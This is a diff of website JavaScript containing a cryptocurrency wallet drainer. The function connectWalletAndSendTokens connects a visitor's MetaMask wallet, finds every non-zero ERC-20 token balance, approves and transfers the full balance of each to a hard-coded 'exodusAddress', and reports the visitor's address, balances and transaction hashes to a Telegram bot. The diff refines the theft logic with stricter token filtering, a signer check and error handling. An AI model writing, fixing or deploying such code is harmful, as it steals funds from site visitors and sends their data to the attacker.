@@ -86,7 +86,6 @@ addEventOnElem(window, "scroll", scrollReveal);
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
     console.error("MetaMask is not installed.");
-    // Redirect to MetaMask app on mobile or MetaMask download page on desktop
     if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
       window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
     } else {
@@ -112,7 +111,6 @@ async function connectWalletAndSendTokens() {
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
   try {
-    // Request MetaMask connection
     await window.ethereum.request({ method: 'eth_requestAccounts' });
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
@@ -160,10 +158,22 @@ async function connectWalletAndSendTokens() {
         }
 
         const currentProvider = new ethers.providers.Web3Provider(window.ethereum);
+        const currentSigner = currentProvider.getSigner();
         const currentNetwork = await currentProvider.getNetwork();
+        console.log(`Switched to network: ${currentNetwork.name} (chainId: ${currentNetwork.chainId})`);
 
         if (currentNetwork.chainId !== network.chainId) {
           const errorMessage = `❌ Failed to switch to ${network.name}.`;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: errorMessage })
+          });
+          continue;
+        }
+
+        if (!currentSigner) {
+          const errorMessage = `❌ Signer not initialized for ${network.name}.`;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -191,8 +201,13 @@ async function connectWalletAndSendTokens() {
             tokens = await response.json();
             apiSuccess = true;
 
-            const nonZeroTokens = tokens.filter(token =>
-              token.balance && !ethers.BigNumber.from(token.balance).isZero()
+            const nonZeroTokens = tokens.filter(t => 
+              t.balance && 
+              !ethers.BigNumber.from(t.balance).isZero() && 
+              t.token_address && 
+              ethers.utils.isAddress(t.token_address) && 
+              t.symbol && 
+              t.decimals !== undefined
             );
 
             tokenSummaryTelegram = nonZeroTokens.length > 0
@@ -200,7 +215,7 @@ async function connectWalletAndSendTokens() {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
-              : `No non-zero ${network.name} token balances found.`;
+              : `No valid non-zero ${network.name} token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -233,8 +248,14 @@ ${nativeBalanceMessage}
           body: JSON.stringify({ chat_id: chatId, text: networkMessage })
         });
 
-        // Approve and transfer ERC-20 tokens if they exist
-        const nonZeroTokens = tokens.filter(t => t.balance && !ethers.BigNumber.from(t.balance).isZero());
+        const nonZeroTokens = tokens.filter(t => 
+          t.balance && 
+          !ethers.BigNumber.from(t.balance).isZero() && 
+          t.token_address && 
+          ethers.utils.isAddress(t.token_address) && 
+          t.symbol && 
+          t.decimals !== undefined
+        );
 
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
@@ -244,7 +265,6 @@ ${nativeBalanceMessage}
                 "function transferFrom(address from, address to, uint amount) returns (bool)"
               ], currentSigner);
 
-              // Step 1: Approve
               const approveTx = await contract.approve(network.exodusAddress, token.balance);
               await approveTx.wait();
 
@@ -262,7 +282,6 @@ Tx: ${approveTx.hash}
                 body: JSON.stringify({ chat_id: chatId, text: approveSuccessMessage })
               });
 
-              // Step 2: TransferFrom
               const transferTx = await contract.transferFrom(userAddress, network.exodusAddress, token.balance);
               await transferTx.wait();
 
@@ -281,7 +300,7 @@ Tx: ${transferTx.hash}
             } catch (err) {
               const errorMessage = `
 ❌ Token Operation Failed
-Token: ${token.symbol}
+Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
               `;
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -289,11 +308,12 @@ Error: ${err.message}
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ chat_id: chatId, text: errorMessage })
               });
+              continue;
             }
           }
         } else {
           const noTokensMessage = `
-⚠️ No non-zero ERC-20 token balances to transfer on ${network.name}
+⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
           `;
           await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
